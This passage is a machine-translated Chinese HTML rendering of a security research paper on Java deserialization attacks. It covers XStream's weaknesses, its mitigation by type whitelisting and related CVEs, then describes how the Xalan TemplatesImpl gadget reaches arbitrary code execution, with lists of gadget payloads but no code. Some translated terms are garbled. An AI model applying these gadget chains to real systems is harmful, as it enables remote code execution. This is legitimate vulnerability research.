<div style="position:absolute;top:16836;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">玉兰CMS</font></font></nobr></div>
<div style="position:absolute;top:16866;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UNRESP</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-</font></font></nobr></div>
<div style="position:absolute;top:16884;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令小服务程序</font></font></nobr></div>
<div style="position:absolute;top:16926;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:16959;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazySearchEnum (4.5)</font></font></a></nobr></div>
<div style="position:absolute;top:16989;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
<div style="position:absolute;top:17019;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常规 (4.19)</font></font></a></nobr></div>
<div style="position:absolute;top:17049;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗马 (4.18)</font></font></a></nobr></div>
<div style="position:absolute;top:17079;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XBean (4.14)</font></font></a></nobr></div>
<div style="position:absolute;top:17109;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">树脂 (4.15)</font></font></a></nobr></div>
<div style="position:absolute;top:17139;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRef (4.20)</font></font></a></nobr></div>
<div style="position:absolute;top:17169;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRemoteObj (4.21)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:17595;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17843;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:18005;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.5 XStream</font></font></b></nobr></div>
<div style="position:absolute;top:18038;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经有很多警告和攻击</font></font></nobr></div>
<div style="position:absolute;top:18056;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31,32</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream 尝试允许尽可能多的对象</font></font></nobr></div>
<div style="position:absolute;top:18073;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽可能多的图表——默认的转换器非常多</font></font></nobr></div>
<div style="position:absolute;top:18091;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类固醇上的 Java 序列化。</font><font style="vertical-align: inherit;">除了调用</font></font></nobr></div>
<div style="position:absolute;top:18109;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个不可序列化的父构造函数，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎是</font></font></nobr></div>
<div style="position:absolute;top:18127;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java序列化可以实现的一切都可以</font></font></nobr></div>
<div style="position:absolute;top:18145;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 XStream 一起使用——包括代理构建。</font><font style="vertical-align: inherit;">那</font></font></nobr></div>
<div style="position:absolute;top:18163;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着大多数</font><font style="vertical-align: inherit;">已发布的 Java Serialization 的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:18181;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小工具应该可以工作。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">35</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而这些类型甚至不必</font></font></nobr></div>
<div style="position:absolute;top:18199;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现 java.io.Serializable。</font></font></nobr></div>
<div style="position:absolute;top:18221;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在解组期间指定根类型，但是</font></font></nobr></div>
<div style="position:absolute;top:18239;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有检查。</font></font></nobr></div>
<div style="position:absolute;top:18262;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的危险</font></font></b></nobr></div>
<div style="position:absolute;top:18294;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream 确实提供了一个可选的 JavaBeanConverter，</font></font></nobr></div>
<div style="position:absolute;top:18312;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它为基于 bean setter 的机制制作有效载荷</font></font></nobr></div>
<div style="position:absolute;top:18330;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果启用，则适用。</font></font></nobr></div>
<div style="position:absolute;top:18371;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它</font></font></nobr></div>
<div style="position:absolute;top:18371;left:215"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该</font></font></nobr></div>
<div style="position:absolute;top:18371;left:294"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:18371;left:346"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">著名的</font></font></nobr></div>
<div style="position:absolute;top:18371;left:420"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那</font></font></nobr></div>
<div style="position:absolute;top:18371;left:484"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用</font></font></nobr></div>
<div style="position:absolute;top:18390;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SerializableConverter/ExternalizableConverter</font></font></nobr></div>
<div style="position:absolute;top:18406;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">甚至 DynamicProxyConverter 也不能缓解</font></font></nobr></div>
<div style="position:absolute;top:18424;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反对所有的小工具。</font><font style="vertical-align: inherit;">使用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ServiceLoader</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font></a> <font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ImageIO</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#20"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:18442;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">懒惰搜索枚举</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#20"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 和</font></font></font><a href="https://translate.googleusercontent.com/translate_f#19"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BindingEnum</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这篇论文显示</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:18460;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些新的标准库——只有向量，甚至没有</font></font></nobr></div>
<div style="position:absolute;top:18478;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须使用代理。</font></font></nobr></div>
<div style="position:absolute;top:18504;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:18536;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream 通过以下方式广泛支持类型过滤</font></font></nobr></div>
<div style="position:absolute;top:18555;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TypePermission，这可用于白名单。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:18572;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一个主要版本将通过以下方式启用白名单</font></font></nobr></div>
<div style="position:absolute;top:18590;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认。</font></font></nobr></div>
<div style="position:absolute;top:18051;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:18080;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2016-5229</font></font></b></nobr></div>
<div style="position:absolute;top:18098;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿特拉斯竹</font></font></nobr></div>
<div style="position:absolute;top:18128;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-2608</font></font></b></nobr></div>
<div style="position:absolute;top:18146;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">詹金斯</font></font></nobr></div>
<div style="position:absolute;top:18176;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报道</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netflix</font></font></nobr></div>
<div style="position:absolute;top:18194;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尤里卡</font></font></nobr></div>
<div style="position:absolute;top:18236;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:18269;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ImageIO (4.6)</font></font></a></nobr></div>
<div style="position:absolute;top:18299;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#19"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定枚举 (4.4)</font></font></a></nobr></div>
<div style="position:absolute;top:18329;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazySearchEnum (4.5)</font></font></a></nobr></div>
<div style="position:absolute;top:18359;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务加载器 (4.3)</font></font></a></nobr></div>
<div style="position:absolute;top:18389;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeanComp (4.17)</font></font></a></nobr></div>
<div style="position:absolute;top:18419;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗马 (4.18)</font></font></a></nobr></div>
<div style="position:absolute;top:18449;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JNDIConfig (4.7)</font></font></a></nobr></div>
<div style="position:absolute;top:18479;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
<div style="position:absolute;top:18508;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringCompAdv (4.11)</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:18695;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31 个</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对 java.beans.EventHandler – 由 Dinis Cruz、Abraham Kang 和 Alvaro 于 2013 年发布</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18711;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">穆尼奥斯：</font></font><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://blog </font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迪尼斯克鲁斯</font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/2013/12/xstream-remote-code-execution-exploit </font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">html</font></font></a></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:18723;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对 Groovy – 由 Arshan Dabirsiaghi 于 2016 年发布：</font></font></font><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对比安全</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:18741;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全影响者/序列化必须死-act-2-xstream</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:18752;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这也意味着终结器不会被注册</font></font></font></nobr></div>
<div style="position:absolute;top:18766;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的转换器引入了一些细微的差异</font></font></font></nobr></div>
<div style="position:absolute;top:18780;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">35 次</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试：Commons Beanutils、Hibernate、C3P0、ROME——所有这些都由 Chris Frohoff 在 ysoserial 中发布</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18797;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和作者：</font></font><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/frohoff/ysoserial/</font></font></a></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:18857;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:19105;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:19264;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 小工具/有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:19306;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于测试目的，发布了所有描述的小工具有效负载的生成器</font></font></nobr></div>
<div style="position:absolute;top:19324;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/marshalsec/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/marshalsec/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/marshalsec/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/mbechler/marshalsec/</font></font></a></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/marshalsec/"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:19368;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1 常见</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:19402;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是在 Java 中最终获得任意代码执行的几种方法。</font><font style="vertical-align: inherit;">除了</font></font></nobr></div>
<div style="position:absolute;top:19420;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过Runtime-&gt;exec()、java.lang.ProcessBuilder执行系统命令</font></font></nobr></div>
<div style="position:absolute;top:19438;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和脚本运行时，这些通常涉及从攻击者提供的定义类</font></font></nobr></div>
<div style="position:absolute;top:19456;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节码并至少初始化它。</font><font style="vertical-align: inherit;">一个这样的场景是构建一个</font></font></nobr></div>
<div style="position:absolute;top:19475;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.net.URLClassLoader 带有攻击者提供的代码库并初始化一个类</font></font></nobr></div>
<div style="position:absolute;top:19492;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从中。</font><font style="vertical-align: inherit;">触发这些机制通常需要能够执行任意</font></font></nobr></div>
<div style="position:absolute;top:19510;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法调用，因此通常需要中介来触发调用</font></font></nobr></div>
<div style="position:absolute;top:19527;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些互动。</font></font></nobr></div>
<div style="position:absolute;top:19571;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.1 Xalan TemplatesImpl</font></font></b></nobr></div>
<div style="position:absolute;top:19603;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该类于 2013 年由 Adam Gowdiak 首次用于沙盒逃逸，并提供</font></font></nobr></div>
<div style="position:absolute;top:19621;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过提供的 Java 直接定义和初始化类的非常罕见的能力</font></font></nobr></div>
<div style="position:absolute;top:19639;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用某些方法时的字节码。</font><font style="vertical-align: inherit;">Oracle/OpenJDK 捆绑了一个修改过的</font></font></nobr></div>
<div style="position:absolute;top:19657;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Xalan 的副本，因此它有两种版本 com.sun.org.apache.xalan.internal。</font></font></nobr></div>
<div style="position:absolute;top:19676;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xsltc.trax.TemplatesImpl </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和上游实现 org.apache.xalan。</font></font></nobr></div>
<div style="position:absolute;top:19694;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xsltc.trax.TemplatesImpl。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37</font></font></font></nobr></div>
<div style="position:absolute;top:19715;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两者之间存在一些细微但在这种情况下很重要的差异。</font><font style="vertical-align: inherit;">自从</font></font></nobr></div>
<div style="position:absolute;top:19733;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 8u45 JDK 版本在到达之前取消引用瞬态 _tfactory 字段</font></font></nobr></div>
<div style="position:absolute;top:19751;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现代码执行的代码。</font><font style="vertical-align: inherit;">这意味着为了恢复一个对象</font></font></nobr></div>
<div style="position:absolute;top:19769;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这对我们的目的有用，我们要么需要能够设置瞬态字段，调用</font></font></nobr></div>
<div style="position:absolute;top:19787;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任意构造函数，或调用 readObject() 的解组器。</font><font style="vertical-align: inherit;">原本的</font></font></nobr></div>
<div style="position:absolute;top:19805;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Xalan 实现没有这个限制。</font></font></nobr></div>
<div style="position:absolute;top:19827;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他必填字段的设置器是私有/受保护的，因此在任何情况下都可以使用</font></font></nobr></div>
<div style="position:absolute;top:19845;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有基于字段的解组器或基于 bean 属性的解组器允许</font></font></nobr></div>
<div style="position:absolute;top:19863;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用非公共设置器..</font></font></nobr></div>
<div style="position:absolute;top:19885;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际触发类初始化/代码执行最常见的方法</font></font></nobr></div>
<div style="position:absolute;top:19905;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">newTransformer() 已被使用。</font><font style="vertical-align: inherit;">但是可以通过public get触发</font></font></nobr></div>
<div style="position:absolute;top:19923;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OutputProperties()（参见</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#29"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.1</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解如何利用它）或私有的</font></font></nobr></div>
<div style="position:absolute;top:19940;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getTransletInstance() 吸气剂也是如此。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:20042;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可在没有其他类路径限制的任何地方使用</font></font></font></nobr></div>
<div style="position:absolute;top:20056;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当类路径上有常规的 Xalan 实现时</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:20119;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20367;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:20529;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2 通过 JNDI 引用执行代码</font></font></b></nobr></div>
